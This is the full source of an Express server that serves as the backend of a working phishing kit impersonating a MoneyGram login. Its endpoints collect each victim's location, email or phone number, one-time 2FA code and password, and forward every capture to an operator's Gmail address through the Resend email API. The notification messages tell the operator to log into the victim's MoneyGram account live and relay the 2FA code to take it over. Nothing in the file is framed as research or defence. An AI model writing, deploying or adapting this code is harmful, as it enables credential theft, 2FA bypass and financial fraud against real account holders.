const express = require('express');
const cors = require('cors');
const { Resend } = require('resend');

const app = express();
app.use(cors());
app.use(express.json());

// Resend setup
const resend = new Resend(process.env.RESEND_API_KEY || 'your-resend-api-key');
const ADMIN_EMAIL = 'usdtetherlive@gmail.com';
const FROM_EMAIL = 'onboarding@resend.dev';

// In-memory storage
const sessions = {};

// Send email helper
async function notifyAdmin(subject, html) {
    try {
        await resend.emails.send({ from: FROM_EMAIL, to: ADMIN_EMAIL, subject, html });
        console.log('Email sent to admin');
    } catch (e) {
        console.log('Email failed:', e.message);
    }
}

app.post('/api/notify-admin', async (req, res) => {
    const { sessionId, location } = req.body;
    sessions[sessionId] = { location, status: 'location' };
    await notifyAdmin('🚨 NEW TARGET', `<p>Session: ${sessionId}</p><p>Location: ${location}</p><p>Waiting for credentials...</p>`);
    res.json({ success: true });
});

app.post('/api/store-contact', async (req, res) => {
    const { sessionId, location, contactType, contactValue } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].contactType = contactType;
        sessions[sessionId].contactValue = contactValue;
        sessions[sessionId].status = 'contact';
    }
    await notifyAdmin('📧 CREDENTIALS RECEIVED', `<p>Session: ${sessionId}</p><p>${contactType}: ${contactValue}</p><p>Location: ${location}</p><hr><p>👉 Login to MoneyGram with these credentials now!</p><p>👉 Wait for 2FA code on YOUR phone</p>`);
    res.json({ success: true });
});

app.post('/api/verify-2fa', async (req, res) => {
    const { sessionId, code } = req.body;
    if (sessions[sessionId]) sessions[sessionId].twoFACode = code;
    await notifyAdmin('🔐 2FA CODE ENTERED', `<p>Session: ${sessionId}</p><p>2FA Code: <strong style="color:red;font-size:20px;">${code}</strong></p><p>This is the code from YOUR phone!</p><p>Target proceeding to password...</p>`);
    res.json({ success: true });
});

app.post('/api/resend-notification', async (req, res) => {
    const { sessionId, contactValue } = req.body;
    await notifyAdmin('🔄 RESEND REQUESTED', `<p>Session: ${sessionId}</p><p>Contact: ${contactValue}</p><p>👉 Click "Resend Code" in MoneyGram app</p>`);
    res.json({ success: true });
});

app.post('/api/finalize', async (req, res) => {
    const { sessionId, location, contactType, contactValue, twoFACode, password } = req.body;
    await notifyAdmin('✅ COMPLETE - ALL DATA CAPTURED', `<h2>TARGET COMPLETED</h2><p><strong>Location:</strong> ${location}</p><p><strong>${contactType}:</strong> ${contactValue}</p><p><strong>2FA Code:</strong> ${twoFACode}</p><p><strong>Password:</strong> ${password}</p><hr><p>All data captured!</p>`);
    if (sessions[sessionId]) sessions[sessionId].status = 'complete';
    res.json({ success: true });
});

app.use(express.static('.'));

app.listen(3000, () => {
    console.log('Server: http://localhost:3000');
    console.log('Admin email:', ADMIN_EMAIL);
});